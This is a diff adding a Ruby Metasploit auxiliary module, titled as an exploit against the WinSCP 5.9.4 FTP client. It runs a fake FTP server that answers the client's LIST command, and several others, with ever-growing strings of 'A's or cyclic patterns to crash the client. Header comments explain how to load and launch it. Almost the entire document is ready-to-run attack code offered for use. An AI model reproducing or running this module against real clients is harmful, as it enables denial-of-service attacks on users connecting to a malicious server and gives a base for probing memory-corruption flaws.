@@ -1,0 +1,419 @@
+##
+# Exploit Title: WinSCP 5.9.4 - (LIST) Command Denial of service (Crush application)
+ 
+# Date: [4-4-2017] mm.dd.yy
+# Exploit Author: [M.Ibrahim]  vulnbug@gmail.com
+# E-Mail:  vulnbug  <at>  gmail.com
+# Vendor Home Page: https://winscp.net/eng/index.php
+# Vendor download link: https://winscp.net/download/WinSCP-5.9.4-Setup.exe
+# Version: [WinSCP 5.9.4] 
+# Tested on: windows 7 x86
+##
+#put the file winSCP 5.9.4.rb in metasploit framework folder name exploit then write this command to refresh all module in metasploit ==> reload_all
+#then run -j 
+#now fake ftp server is ready 
+#try to connect to this fake ftp server with winscp client and it will crush
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+  include Exploit::Remote::TcpServer
+
+  def initialize()
+    super(
+      'Name'           => 'WinSCP CRUSHER',
+      'Description'    => %q{
+        This module will Crush WinSCP FTP client 
+      },
+      'Author'         => [ 'M.Ibrahim <vulnbug[at]gmail.com>' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'URL', 'http://www.google.com' ],
+        ]
+      )
+    register_options(
+      [
+      OptPort.new('SRVPORT', [ true, "The local port to listen on.", 21 ]),
+      OptString.new('FUZZCMDS', [ true, "The FTP client server Command to crush.", "LIST", nil, /(?:[A-Z]+,?)+/ ]),
+      OptInt.new('STARTSIZE', [ true, "Crush string startsize.",2000]),
+      OptInt.new('ENDSIZE', [ true, "Max Fuzzing string size.",200000]),
+      OptInt.new('STEPSIZE', [ true, "Increment fuzzing string each attempt.",1000]),
+      OptBool.new('RESET', [ true, "Reset fuzzing values after client disconnects with QUIT cmd.",true]),
+      OptString.new('WELCOME', [ true, "Fake FTP Server welcome message.","FTP WinSCP server CRusher"]),
+      OptBool.new('CYCLIC', [ true, "Use Cyclic pattern instead of A's .",false]),
+      OptBool.new('ERROR', [ true, "Reply with error codes only",false]),
+      OptBool.new('EXTRALINE', [ true, "Add extra CRLF's in response to LIST",true])
+      ], self.class)
+  end
+
+  
+
+  def support_ipv6?
+    false
+  end
+
+  def setup
+    super
+    @state = {}
+  end
+
+  def run
+    @fuzzsize=datastore['STARTSIZE'].to_i
+    exploit()
+  end
+
+  
+  def on_client_connect(c)
+    @state[c] = {
+      :name => "#{c.peerhost}:#{c.peerport}",
+      :ip   => c.peerhost,
+      :port => c.peerport,
+      :user => nil,
+      :pass => nil
+    }
+    
+    print_status("Client connected : " + c.peerhost)
+    active_data_port_for_client(c, 20)
+    send_response(c,"","WELCOME",220," "+datastore['WELCOME'])
+    
+  end
+
+  def on_client_close(c)
+    @state.delete(c)
+  end
+
+  
+  def passive_data_port_for_client(c)
+    @state[c][:mode] = :passive
+    if(not @state[c][:passive_sock])
+      s = Rex::Socket::TcpServer.create(
+        'LocalHost' => '0.0.0.0',
+        'LocalPort' => 0,
+        'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
+      )
+      dport = s.getsockname[2]
+      @state[c][:passive_sock] = s
+      @state[c][:passive_port] = dport
+      
+    end
+    @state[c][:passive_port]
+  end
+
+
+  def active_data_port_for_client(c,port)
+    @state[c][:mode] = :active
+    connector = Proc.new {
+      host = c.peerhost.dup
+      sock = Rex::Socket::Tcp.create(
+        'PeerHost' => host,
+        'PeerPort' => port,
+        'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
+      )
+    }
+    @state[c][:active_connector] = connector
+    @state[c][:active_port]      = port
+   
+  end
+
+
+  def establish_data_connection(c)
+    
+    begin
+    Timeout.timeout(20) do
+      if(@state[c][:mode] == :active)
+        return @state[c][:active_connector].call()
+      end
+      if(@state[c][:mode] == :passive)
+        return @state[c][:passive_sock].accept
+      end
+    end
+    
+    rescue ::Exception => e
+      print_error("Failed to establish data connection: #{e.class} #{e}")
+    end
+    nil
+  end
+
+  
+  def on_client_data(c)
+
+    data = c.get_once
+    return if not data
+
+    cmd,arg = data.strip.split(/\s+/, 2)
+    arg ||= ""
+
+    return if not cmd
+
+    case cmd.upcase.strip
+
+    when 'USER'
+      @state[c][:user] = arg
+      send_response(c,arg,"USER",331," User name okay, need password")
+      return
+
+    when 'PASS'
+      @state[c][:pass] = arg
+      send_response(c,arg,"PASS",230,"-Password accepted.\r\n230 User logged in.")
+      return
+
+    when 'QUIT'
+      if (datastore['RESET'])
+        print_status("Resetting fuzz settings")
+        @fuzzsize = datastore['STARTSIZE']
+        @stepsize = datastore['STEPSIZE']
+      end
+      print_status("** Client disconnected **")
+      send_response(c,arg,"QUIT",221," User logged out")
+      return
+
+    when 'SYST'
+      send_response(c,arg,"SYST",215," UNIX Type: L8")
+      return
+
+    when 'TYPE'
+      send_response(c,arg,"TYPE",200," Type set to #{arg}")
+      return
+
+    when 'CWD'
+      send_response(c,arg,"CWD",250," CWD Command successful")
+      return
+
+    when 'PWD'
+      send_response(c,arg,"PWD",257," \"/\" is current directory.")
+      return
+
+    when 'REST'
+      send_response(c,arg,"REST",200," OK")
+      return
+
+    when 'XPWD'
+      send_response(c,arg,"PWD",257," \"/\" is current directory")
+      return
+
+    when 'SIZE'
+      send_response(c,arg,"SIZE",213," 1")
+      return
+
+    when 'MDTM'
+      send_response(c,arg,"MDTM",213," #{Time.now.strftime("%Y%m%d%H%M%S")}")
+      return
+
+    when 'CDUP'
+      send_response(c,arg,"CDUP",257," \"/\" is current directory")
+      return
+
+    when 'PORT'
+      port = arg.split(',')[4,2]
+      if(not port and port.length == 2)
+        c.put("500 Illegal PORT command.\r\n")
+        return
+      end
+      port = port.map{|x| x.to_i}.pack('C*').unpack('n')[0]
+      active_data_port_for_client(c, port)
+      send_response(c,arg,"PORT",200," PORT command successful")
+      return
+
+    when 'PASV'
+
+      daddr = Rex::Socket.source_address(c.peerhost)
+      dport = passive_data_port_for_client(c)
+      @state[c][:daddr] = daddr
+      @state[c][:dport] = dport
+      pasv  = (daddr.split('.') + [dport].pack('n').unpack('CC')).join(',')
+      dofuzz = fuzz_this_cmd("PASV")
+      code = 227
+      if datastore['ERROR']
+        code = 557
+      end
+      if (dofuzz==1)
+
+        send_response(c,arg,"PASV",code," Entering Passive Mode (#{@fuzzdata},1,1,1,1,1)\r\n")
+        incr_fuzzsize()
+      else
+        send_response(c,arg,"PASV",code," Entering Passive Mode (#{pasv})")
+      end
+      return
+
+    when /^(LIST|NLST|LS)$/
+
+
+      conn = establish_data_connection(c)
+      if(not conn)
+        c.put("425 Can't build data connection\r\n")
+        return
+      end
+
+      code = 150
+      if datastore['ERROR']
+        code = 550
+      end
+      c.put("#{code} Here comes the directory listing.\r\n")
+      code = 226
+      if datastore['ERROR']
+        code = 550
+      end
+      c.put("#{code} Directory send ok.\r\n")
+      strfile = "passwords.txt"
+      strfolder = "Secret files"
+      dofuzz = fuzz_this_cmd("LIST")
+      if (dofuzz==1)
+        strfile = @fuzzdata + ".txt"
+        strfolder = @fuzzdata
+        paylen = @fuzzdata.length
+
+        incr_fuzzsize()
+      end
+
+      dirlist = ""
+      if datastore['EXTRALINE']
+        extra = "\r\n"
+      else
+        extra = ""
+      end
+      dirlist = "drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{strfolder}\r\n" + extra
+      dirlist << "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{strfile}\r\n" + extra
+      conn.put("total 2\r\n"+dirlist)
+      conn.close
+      return
+
+    when 'RETR'
+
+
+      conn = establish_data_connection(c)
+      if(not conn)
+        c.put("425 Can't build data connection\r\n")
+        return
+      end
+      print_status(" - Data connection set up")
+      strcontent = "blahblahblah"
+      dofuzz = fuzz_this_cmd("LIST")
+      if (dofuzz==1)
+        strcontent = @fuzzdata
+        paylen = @fuzzdata.length
+
+        incr_fuzzsize()
+      end
+      c.put("150 Opening BINARY mode data connection #{strcontent}\r\n")
+      print_status(" - Sending data via data connection")
+      conn.put(strcontent)
+      c.put("226 Transfer complete\r\n")
+      conn.close
+      return
+
+    when /^(STOR|MKD|REM|DEL|RMD)$/
+      send_response(c,arg,cmd.upcase,500," Access denied")
+      return
+
+    when 'FEAT'
+      send_response(c,arg,"FEAT","","211-Features:\r\n211 End")
+      return
+
+    when 'HELP'
+      send_response(c,arg,"HELP",214," Syntax: #{arg} - (#{arg}-specific commands)")
+
+    when 'SITE'
+      send_response(c,arg,"SITE",200," OK")
+      return
+
+    when 'NOOP'
+      send_response(c,arg,"NOOP",200," OK")
+      return
+
+    when 'ABOR'
+      send_response(c,arg,"ABOR",225," Abor command successful")
+      return
+
+    when 'ACCT'
+      send_response(c,arg,"ACCT",200," OK")
+      return
+
+    when 'RNFR'
+      send_response(c,arg,"RNRF",350," File exists")
+      return
+
+    when 'RNTO'
+      send_response(c,arg,"RNTO",350," File exists")
+      return
+    else
+      send_response(c,arg,cmd.upcase,200," Command not understood")
+      return
+    end
+    return
+  end
+
+
+
+
+  def fuzz_this_cmd(cmd)
+    @fuzzcommands = datastore['FUZZCMDS'].split(",")
+    fuzzme = 0
+    @fuzzcommands.each do |thiscmd|
+      if ((cmd.upcase == thiscmd.upcase) || (thiscmd=="*")) && (fuzzme==0)
+        fuzzme = 1
+      end
+    end
+    if fuzzme==1
+
+      if datastore['CYCLIC']
+        @fuzzdata = Rex::Text.pattern_create(@fuzzsize)
+      else
+        @fuzzdata = "A" * @fuzzsize
+      end
+    end
+    return fuzzme
+  end
+
+  def incr_fuzzsize
+    @stepsize = datastore['STEPSIZE'].to_i
+    @fuzzsize = @fuzzsize + @stepsize
+
+    if (@fuzzsize > datastore['ENDSIZE'].to_i)
+      @fuzzsize = datastore['ENDSIZE'].to_i
+    end
+  end
+
+
+
+  def send_response(c,arg,cmd,code,msg)
+    if arg.length > 40
+      showarg = arg[0,40] + "..."
+    else
+      showarg = arg
+    end
+    if cmd.length > 40
+      showcmd = cmd[0,40] + "..."
+    else
+      showcmd = cmd
+    end
+
+    dofuzz = fuzz_this_cmd(cmd)
+
+    if (dofuzz==1) && (cmd.upcase != "PASV")
+      paylen = @fuzzdata.length
+
+      if datastore['ERROR']
+        code = "550 "
+      end
+      if cmd=="FEAT"
+        @fuzzdata = "211-Features:\r\n "+@fuzzdata+"\r\n211 End"
+      end
+      if cmd=="PWD"
+        @fuzzdata = "  \"/"+@fuzzdata+"\" is current directory"
+      end
+      cmsg = code.to_s + " " + @fuzzdata
+      c.put("#{cmsg}\r\n")
+      print_status("* Fuzz data sent")
+      incr_fuzzsize()
+    else
+     
+      cmsg = code.to_s + msg
+      cmsg = cmsg.strip
+      c.put("#{cmsg}\r\n")
+    end
+    return
+  end
+end
